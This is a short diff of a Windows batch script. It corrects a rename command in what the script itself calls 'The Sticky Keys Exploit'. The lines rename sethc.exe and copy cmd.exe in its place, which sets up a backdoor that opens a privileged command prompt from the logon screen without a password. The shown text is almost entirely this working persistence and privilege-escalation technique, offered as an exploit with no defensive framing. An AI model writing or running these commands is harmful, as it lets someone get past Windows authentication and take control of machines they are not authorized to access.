@@ -20,7 +20,7 @@ echo Error: Invalid input
 goto End
 
 :1
-ren C:\Windows\System32\sethc.exe C:\Windows\System32\etc.exe.bak
+ren C:\Windows\System32\sethc.exe etc.exe.bak
 copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
 echo The Sticky Keys Exploit has been injected successfully!
 goto End
